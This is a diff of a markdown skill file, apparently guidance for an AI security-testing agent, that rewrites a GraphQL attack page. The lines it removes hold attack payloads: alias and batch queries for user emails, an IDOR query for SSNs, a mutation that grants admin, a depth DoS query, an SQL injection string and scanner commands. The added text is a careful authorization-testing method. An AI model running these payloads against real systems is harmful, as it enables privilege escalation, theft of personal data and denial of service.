@@ -1,88 +1,53 @@
-# SKILL: GraphQL Attacks
+# GraphQL — compatibility route to schema/resolver security
 
-## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (graphql attacks) or pasted request matching this class
+Use [GraphQL schema and resolver methodology](../../../../api-mode/SKILL_FILES/VULNERABILITIES/API/graphql_introspection_attacks.md)
+as the canonical guide. Schema discovery, operation authorization and batching belong there.
+This compatibility entry preserves browser-specific distinctions without another payload dump.
 
----
+## Browser entry and normal controls
 
-## IDENTITY IN THIS SKILL
-GraphQL flattens authorization. I focus on: introspection, batched queries, alias-based brute, depth-limit DoS, IDOR via field, GraphQL → SQL/SSRF/RCE.
+Capture one actual query/mutation/subscription with its variables, auth state and effect.
+An enabled introspection endpoint is inventory, not automatically sensitive-data exposure.
+An `Upload` scalar does not establish unauthorized upload or executable serving.
+Two aliases in one request are still subject to whatever object/field checks the resolver performs.
 
----
+## PAYLOADS — controlled object authorization
 
-## DETECTION
-Find `/graphql`, `/api/graphql`, `/v1/graphql`, `graphiql`. Test introspection.
+Use a query already present in the client and substitute a second owned fixture ID:
 
-## EXPLOITATION
-### Introspection enabled
-```
-query { __schema { types { name fields { name } } } }
-```
-
-### Alias-based bypass of per-field rate limit / log
 ```graphql
-query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }
+query Audit($id: ID!) {
+  document(id: $id) { id title }
+}
 ```
 
-### Batched queries
 ```json
-[{"query":"{ user(id:1){email} }"}, {"query":"{ user(id:2){email} }"}]
+{"id":"OTHER_OWNED_DOCUMENT"}
 ```
 
-### Field-level IDOR
-```graphql
-query { user(id:"OTHER_USER_UUID"){ email phone ssn } }
-```
+Prove the legitimate owner reads `AUDIT_B`, then test lower-authority A on the same real resolver.
+Adapt names/types to the actual schema; an unknown-field or invalid-ID error is not an ACL control.
+Do not request real customer fields to decorate the proof.
 
-### Mutation injection (no auth on mutations)
-```graphql
-mutation { updateUserRole(userId:"victim", role:"admin") { id role } }
-```
+## Browser-only boundaries
 
-### Depth-limit DoS
-```graphql
-query Q($x:ID!){ user(id:$x){ posts{ author{ posts{ author{ posts{ author{ id }}}}}}}}
-```
+A GET query returning email is not a demonstrated CSRF state change, and issuing it cross-origin
+usually does not let the attacker's script read it. A read disclosure needs its own delivery/read
+mechanism such as CORS or a proven cross-origin side channel.
 
-### CSRF on GraphQL via GET (when GET enabled)
-```
-GET /graphql?query={user(id:1){email}}
-```
+For CSRF, identify a real mutation or other security-relevant side effect, an accepted browser-
+producible method/content type, ambient credentials, and a working cross-site delivery PoC.
+Servers that execute mutations via GET or simple form content types deserve specific investigation;
+GET support or missing CSRF header alone is not sufficient.
 
-### SSRF/SQLi via field args (custom resolvers)
-```graphql
-query { rawSearch(filter:"' OR 1=1-- -") { items } }
-```
+Route that boundary to `csrf_all_types.md`; route response readability to `cors_misconfig.md`.
+Keep resolver ACL, batch accounting, subscriptions and introspection coverage in the canonical file.
 
-### File upload via multipart spec
-Test if `Upload` scalar is exposed → arbitrary file upload (often unauth).
+## Sources and limits
 
-## PAYLOADS (real, copy-paste, grouped)
-(see above)
+Sources reviewed 2026-11-13. The operation above is schematic and not an actual target schema.
+Do not assign severity from the existence of GraphQL or claim aliasing itself bypasses authorization.
 
-## BYPASS TECHNIQUES
-Disabled introspection → clairvoyance schema brute. Suggestions disabled → wordlist.
-
-## CHAIN POTENTIAL
-GraphQL IDOR + alias batching + introspection = mass PII dump.
-
-## TOOLS
-graphw00f, clairvoyance, inql, graphql-cop, BatchQL
-
-## COMMANDS
-```bash
-graphw00f -d -t https://target/graphql
-clairvoyance -o schema.json -w ~/wordlists/graphql/graphql-words.txt https://target/graphql
-inql -t https://target/graphql --generate-html
-```
-
-## EDGE CASES / NOT-A-BUG TRAPS
-AWS AppSync / Hasura / Apollo Federation each have engine-specific quirks — fingerprint first.
-
-## TRIAGE ANGLE (per platform)
-Show authorization bypass via field aliasing + privileged data exfil.
-
-## SEVERITY & CVSS
-8.0–9.5.
-
-## REFERENCES
-Doyensec GraphQL • PortSwigger GraphQL labs • bb_kb/GraphQL/
+- [PortSwigger: GraphQL vulnerabilities](https://portswigger.net/web-security/graphql) — schema discovery, aliases, access control and browser delivery considerations.
+- [OWASP: GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html) — resolver authorization, query controls and batching boundaries.
+- [OWASP: Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) — per-action/relationship checks underlying GraphQL operations.
